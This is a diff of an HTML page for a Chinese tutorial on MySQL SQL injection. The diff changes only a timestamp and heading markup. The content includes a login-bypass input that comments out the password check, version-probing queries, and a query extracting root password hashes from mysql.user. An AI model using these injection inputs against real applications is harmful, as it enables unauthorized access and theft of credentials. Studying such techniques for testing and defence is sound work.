@@ -69,7 +69,7 @@ SQL语法
 
 ```
 反引号">
-<meta property="og:updated_time" content="2015-08-12T08:01:47.979Z">
+<meta property="og:updated_time" content="2015-08-12T08:19:49.386Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MySql练级攻略(4)-SQL注入之数据库常量及函数">
 <meta name="twitter:description" content="关于引号在SQL语句中可以使用很多引号  “ 还是 ‘ 只要是成对出现后面的语句可以继续执行    mysql&amp;gt; select username”””‘’’’” from admin where id = “1”‘’;关于注释
@@ -355,7 +355,7 @@ SQL语法
 <pre><code>mysql&gt; select id from admin where username = <span class="string">"admin"</span> <span class="keyword">and</span> password = <span class="string">'123456'</span>; <span class="regexp">//</span>正常的语句
 将admin处的输入构造为  `admin<span class="string">";#`
 mysql&gt; select id from admin where username = "</span>admin<span class="string">";#"</span> <span class="keyword">and</span> password = <span class="string">'123456'</span>;<span class="regexp">//</span>构造后的语句这样不经过<span class="keyword">and</span>后的验证直接返回符合的id
-</code></pre><h2>常量</h2><br><h5>version</h5><br><br>    VERSION()<br>    @@VERSION<br>    @@GLOBAL.VERSION<br>    mysql&gt; select @@version;//显示mysql版本<br>    mysql&gt; select * from user where 1 and mid(version(),1,1) = 5;//当数据库版本为5.x.xx时返回为真<br><br><h5>user</h5><br><br>    user()<br>    current_user<br>    current_user()<br>    system_user()<br>    session_user()<br>    mysql&gt; select user(); //显示当前用户<br>    mysql&gt; select concat_ws(“:”,user,password) from mysql.user where user = “root”; //显示 root:”对应用户密码散列值”<br><br><h5>database</h5><br><br>    database()<br>    schema()<br>    mysql&gt; select database();//显示mysql<br>    select schema_name from information_schema.schemata;//显示所有数据库<br><br><h5>host</h5><br><br>    @@host<br>    mysql&gt; select @@host;<br><br><h2>函数</h2>
+</code></pre><h2>常量</h2><br>version<br><br>    VERSION()<br>    @@VERSION<br>    @@GLOBAL.VERSION<br>    mysql&gt; select @@version;//显示mysql版本<br>    mysql&gt; select * from user where 1 and mid(version(),1,1) = 5;//当数据库版本为5.x.xx时返回为真<br><br>user<br><br>    user()<br>    current_user<br>    current_user()<br>    system_user()<br>    session_user()<br>    mysql&gt; select user(); //显示当前用户<br>    mysql&gt; select concat_ws(“:”,user,password) from mysql.user where user = “root”; //显示 root:”对应用户密码散列值”<br><br>database<br><br>    database()<br>    schema()<br>    mysql&gt; select database();//显示mysql<br>    select schema_name from information_schema.schemata;//显示所有数据库<br><br>host<br><br>    @@host<br>    mysql&gt; select @@host;<br><br><h2>函数</h2>
 
 <pre><code>length<span class="params">()</span>
 mysql&gt; select length<span class="params">(<span class="string">"abc"</span>)</span>;<span class="comment">//字符串长度</span>
